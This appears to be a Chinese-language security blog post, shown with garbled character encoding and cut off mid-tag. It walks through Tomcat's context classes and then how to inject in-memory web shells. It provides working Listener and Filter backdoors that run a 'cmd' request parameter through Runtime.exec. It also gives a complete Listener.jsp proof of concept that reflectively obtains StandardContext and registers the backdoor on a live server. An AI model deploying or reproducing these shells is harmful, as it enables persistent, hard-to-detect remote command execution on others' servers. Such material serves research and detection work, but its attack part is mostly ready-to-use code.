title="ServletContext"></a>ServletContext</h3><p>Servletè§„èŒƒä¸­è§„å®šäº†ä¸€ä¸ªServletContextæ¥å£ï¼Œå…¶ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­æ‰€æœ‰Servletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œèƒ½å¯¹Servletä¸­çš„å„ç§èµ„æºè¿›è¡Œè®¿é—®ã€æ·»åŠ ã€åˆ é™¤ç­‰ã€‚å…¶åœ¨Javaä¸­çš„å…·ä½“å®ç°æ˜¯<code>javax.servlet.ServletContext</code>æ¥å£</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>åœ¨Tomcatä¸­ï¼ŒServletContextæ¥å£çš„å…·ä½“å®ç°å°±æ˜¯ApplicationContextç±»ï¼Œå…¶å®ç°äº†ServletContextæ¥å£ä¸­å®šä¹‰çš„ä¸€äº›æ–¹æ³•ã€‚</p><p>Tomcatè¿™é‡Œä½¿ç”¨äº†<code>é—¨é¢æ¨¡å¼</code>ï¼Œå¯¹<code>ApplicationContext</code>ç±»è¿›è¡Œäº†å°è£…ï¼Œæˆ‘ä»¬è°ƒç”¨<code>getServletContext()</code>æ–¹æ³•è·å¾—çš„å…¶å®æ˜¯<code>ApplicationContextFacade</code>ç±»(é—¨é¢ç±»)</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ApplicationContextFacade</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.context = context;<span class="comment">//contextçš„ä¼ é€’</span></span><br><span class="line"> </span><br><span class="line">        classCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        objectCache = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">        initClassCache();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><code>ApplicationContextFacade</code>ç±»æ–¹æ³•ä¸­éƒ½ä¼šè°ƒç”¨this.contextç›¸åº”çš„æ–¹æ³•ï¼Œå› æ­¤æœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯<code>ApplicationContext</code>ç±»çš„æ–¹æ³•ã€‚</p><blockquote><p>é—¨é¢æ¨¡å¼å¯ä»¥ç®€å•åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:å­ç³»ç»Ÿã€é—¨é¢(Facade)ã€å®¢æˆ·ç«¯</p><p>å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è°ƒç”¨é—¨é¢æ–¹æ³•è¿›è€Œè°ƒç”¨é›†æˆçš„å­ç³»ç»Ÿæ–¹æ³•ï¼Œä»¥åŒ»é™¢ç±»æ¯”ï¼Œå®¢æˆ·ç«¯ç›¸å½“äºç—…äººï¼Œé—¨é¢ç›¸å½“äºæ¥å¾…å‘˜ï¼Œè€Œå­ç³»ç»Ÿæ˜¯åŒ»é™¢å†…éƒ¨ç»†åŒ–çš„å„éƒ¨é—¨ã€‚</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>æ˜¯å­å®¹å™¨<code>Context</code>çš„æ ‡å‡†å®ç°ç±»ï¼Œå…¶ä¸­åŒ…å«äº†å¯¹Contextå­å®¹å™¨ä¸­èµ„æºçš„å„ç§æ“ä½œã€‚</p><p><code>ApplicationContext</code>ä¸­çš„è®¸å¤šæ–¹æ³•å®é™…ä¸Šè¿˜æ˜¯è°ƒç”¨äº†<code>StandardContext</code>ä¸­çš„æ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationContext</span> <span class="keyword">implements</span> <span class="title class_">ServletContext</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StandardContext context;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> String <span class="title function_">getRequestCharacterEncoding</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> context.getRequestCharacterEncoding();</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301312219609.png"                      alt="image-20230131221926469"                ><figcaption>image-20230131221926469</figcaption></figure></p><blockquote><p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬å¯¹Contextå®¹å™¨ä¸­å„ç§èµ„æºè¿›è¡Œæ“ä½œæ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯StandardContextä¸­çš„æ–¹æ³•ï¼Œå› æ­¤StandardContextæ˜¯Tomcatä¸­è´Ÿè´£ä¸åº•å±‚äº¤äº’çš„Contextã€‚</p></blockquote><h2 id="0x01-Tomcatå†…å­˜é©¬"><a href="#0x01-Tomcatå†…å­˜é©¬" class="headerlink" title="0x01 Tomcatå†…å­˜é©¬"></a>0x01 Tomcatå†…å­˜é©¬</h2><p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹,Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p><p>è¿™ä¾èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œä¸ºæ–¹ä¾¿è°ƒè¯•ï¼Œå…ˆåŠ å…¥Tomcatä¾èµ–</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.0.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ³¨æ„ç‰ˆæœ¬ä¸æœ¬æœºtomcatåŒ¹é…ï¼Œtomcat10åæŠŠå¾ˆå¤šå¸¸ç”¨ç±»çš„ä½ç½®éƒ½æ”¹äº†</p></blockquote><h3 id="Listenerå‹"><a href="#Listenerå‹" class="headerlink" title="Listenerå‹"></a>Listenerå‹</h3><p>ç›®æ ‡å°±æ˜¯åœ¨æœåŠ¡å™¨ä¸­åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Listenerã€‚</p><p>è€ŒListeneræ ¹æ®äº‹ä»¶æºçš„ä¸åŒï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸‰ç§</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>ç”¨äºç›‘å¬<code>ServletRequest</code>å¯¹è±¡ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•</p></blockquote><p>åˆ›å»ºä¸€ä¸ªServleté¡¹ç›®å®ç°æ¶æ„Listener,ç›®å½•é…ç½®â¬‡ï¸</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010141228.png"                      alt="image-20230201014157169"                ><figcaption>image-20230201014157169</figcaption></figure></p><p>shell_Listener</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è®¿é—®ä»»æ„ç›®å½•å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010146200.png"                      alt="image-20230201014602139"                ><figcaption>image-20230201014602139</figcaption></figure></p><blockquote><p>æ¥ä¸‹æ¥åªè¦å°†æ¶æ„ListeneråŠ¨æ€æ³¨å†Œè¿›æœåŠ¡å™¨</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>è°ƒç”¨æ ˆ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">13</span>, shell_Listener (Listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5992</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">121</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>StandardContext#fireRequestInitEvent</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fireRequestInitEvent</span><span class="params">(ServletRequest request)</span> &#123;</span><br><span class="line">        Object instances[] = getApplicationEventListeners();<span class="comment">//è·å–Listeneræ•°ç»„</span></span><br><span class="line">        <span class="keyword">if</span> ((instances != <span class="literal">null</span>) &amp;&amp; (instances.length &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">ServletRequestEvent</span> <span class="variable">event</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(getServletContext(), request);</span><br><span class="line">            <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletRequestListener)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletRequestListener) instance;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.requestInitialized(event);<span class="comment">//éå†è§¦å‘æ•°ç»„å†…å„Listenerçš„requestInitializedæ–¹æ³•</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                            instance.getClass().getName()), t);</span><br><span class="line">                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›ç¬¬ä¸€è¡Œçš„<code>getApplicationEventListeners()</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>();<span class="comment">//å­˜å‚¨é‡ŒListener</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010157913.png"                      alt="image-20230201015745831"                ><figcaption>image-20230201015745831</figcaption></figure></p><p><code>StandardContext</code>ä¹Ÿå®šä¹‰ç±»æ·»åŠ Listenerçš„æ–¹æ³•,é‚£ä¹ˆæˆ‘ä»¬ä¸ºäº†æ³¨å†Œæ¶æ„Listenerï¼Œå°±å¿…é¡»å…ˆè·å–<code>StandardContext</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="è·å–StandardContextç±»"><a href="#è·å–StandardContextç±»" class="headerlink" title="è·å–StandardContextç±»"></a>è·å–StandardContextç±»</h4><p>åœ¨<code>StandardHostValve#invoke</code>ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶é€šè¿‡requestå¯¹è±¡æ¥è·å–<code>StandardContext</code>ç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Select the Context to be used for this Request</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext();</span><br></pre></td></tr></table></figure></div><p>JSPå†…ç½®äº†requestå¯¹è±¡,å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å–</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥åˆ©ç”¨ç±»åŠ è½½å™¨</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>å†æ·»åŠ ä¸€ä¸‹ä¸Šé¢å†™çš„æ¶æ„Listener</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">shell_Listener</span> <span class="variable">shell_listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">shell_Listener</span>();</span><br><span class="line">  context.addApplicationEventListener(shell_listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><h4 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><p>Listener.jsp</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>æµ‹è¯•å‰ï¼Œå…ˆå°†ä¹‹å‰çš„Listeneråˆ é™¤ï¼Œå…ˆç›´æ¥å°è¯•å‘½ä»¤æ‰§è¡Œï¼Œå‘ç°å¼¹è®¡ç®—å™¨å¤±è´¥ï¼Œå†è®¿é—®ä¸€ä¸‹Listener.jsp</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010211631.png"                      alt="image-20230201021155544"                ><figcaption>image-20230201021155544</figcaption></figure></p><p>æ­¤æ—¶Shell_Listenerå·²ç»è¢«åŠ è½½è¿›æœåŠ¡å™¨ï¼Œå†æ¬¡å°è¯•å¼¹è®¡ç®—å™¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010212384.png"                      alt="image-20230201021249301"                ><figcaption>image-20230201021249301</figcaption></figure></p><h3 id="Filterå‹"><a href="#Filterå‹" class="headerlink" title="Filterå‹"></a>Filterå‹</h3><p>ä»¿ç…§Listenerçš„æ€è·¯ï¼Œå®ç°ä¸€ä¸ªæ¶æ„Filterã€‚Filterçš„è°ƒç”¨æ˜¯é€šè¿‡FilterChainå®ç°çš„ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010214825.png"                      alt="image-20230201021445758"                ><figcaption>image-20230201021445758</figcaption></figure></p><blockquote><p>åªè¦é‡å†™doFilteræ–¹æ³•å³å¯</p></blockquote><p>æ¶æ„Filter</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span> <span class="comment">//åº”ç”¨åˆ°æ‰€æœ‰è·¯ç”±</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | NullPointerException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010219311.png"                      alt="image-20230201021930234"                ><figcaption>image-20230201021930234</figcaption></figure></p><h4 id="Filterè°ƒç”¨åˆ†æ"><a href="#Filterè°ƒç”¨åˆ†æ" class="headerlink" title="Filterè°ƒç”¨åˆ†æ"></a>Filterè°ƒç”¨åˆ†æ</h4><p>è°ƒç”¨æ ˆ</p><div class="highlight-container" data-rel="Java"><figure 